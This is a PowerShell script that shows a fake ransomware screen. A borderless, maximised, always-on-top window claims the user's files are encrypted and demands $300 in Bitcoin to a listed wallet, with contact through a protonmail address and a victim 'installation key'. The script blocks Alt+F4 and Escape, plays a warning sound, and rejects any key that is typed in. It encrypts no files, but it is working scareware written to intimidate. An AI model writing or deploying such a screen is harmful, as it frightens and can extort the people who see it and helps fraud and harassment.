Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.BackColor = 'Black'
$form.TopMost = $true
$form.KeyPreview = $true
$form.Text = 'Ooops, your files have been encrypted.'

# Title Label
$title = New-Object Windows.Forms.Label
$title.Text = "Ooops, your important files are encrypted."
$title.Font = New-Object Drawing.Font("Consolas", 24, 'Bold')
$title.ForeColor = 'Red'
$title.AutoSize = $false
$title.TextAlign = 'MiddleLeft'
$title.Dock = 'Top'
$title.Height = 60
$title.Padding = '20,10,0,0'
$form.Controls.Add($title)

# Instructions
$instructions = @"
If you see this text, then your files are no longer accessible, because they have been encrypted.
Perhaps you are busy looking for a way to recover your files, but don't waste your time.
Nobody can recover your files without our decryption service.

We guarantee that you can recover all your files safely and easily.
All you need to do is submit the payment and purchase the decryption key.

Please follow the instructions:
1. Send $300 worth of Bitcoin to following address:
   1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX

2. Send your Bitcoin wallet ID and personal installation key to e-mail:
   wnshth123456@protonmail.com

   Your personal installation key:
   zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A

If you already purchased your key, please enter it below.
"@

$body = New-Object Windows.Forms.TextBox
$body.Multiline = $true
$body.ReadOnly = $true
$body.BackColor = 'Black'
$body.ForeColor = 'White'
$body.Font = New-Object Drawing.Font("Consolas", 14)
$body.Text = $instructions
$body.Dock = 'Fill'
$form.Controls.Add($body)

# Decryption Key Entry Box
$inputPanel = New-Object Windows.Forms.Panel
$inputPanel.Dock = 'Bottom'
$inputPanel.Height = 120
$inputPanel.BackColor = 'Black'

$keyLabel = New-Object Windows.Forms.Label
$keyLabel.Text = "Key:"
$keyLabel.ForeColor = 'White'
$keyLabel.Font = New-Object Drawing.Font("Consolas", 14)
$keyLabel.AutoSize = $true
$keyLabel.Location = New-Object Drawing.Point(20, 40)

$keyBox = New-Object Windows.Forms.TextBox
$keyBox.Width = 400
$keyBox.Font = New-Object Drawing.Font("Consolas", 14)
$keyBox.Location = New-Object Drawing.Point(80, 36)
$keyBox.ForeColor = 'White'
$keyBox.BackColor = 'Black'

$submit = New-Object Windows.Forms.Button
$submit.Text = "Submit"
$submit.Font = New-Object Drawing.Font("Consolas", 12)
$submit.Location = New-Object Drawing.Point(500, 35)
$submit.BackColor = 'DarkRed'
$submit.ForeColor = 'White'

$submit.Add_Click({
    [System.Windows.Forms.MessageBox]::Show("Invalid key. Decryption failed.","Error",0,'Error')
})

$inputPanel.Controls.Add($keyLabel)
$inputPanel.Controls.Add($keyBox)
$inputPanel.Controls.Add($submit)
$form.Controls.Add($inputPanel)

# Block Alt+F4 and Escape
$form.Add_KeyDown({
    if ($_.Alt -and $_.KeyCode -eq "F4") { $_.Handled = $true }
    if ($_.KeyCode -eq "Escape") { $_.Handled = $true }
})

# Play warning sound
[System.Media.SystemSounds]::Exclamation.Play()

# Show the fake ransomware window
$form.ShowDialog()
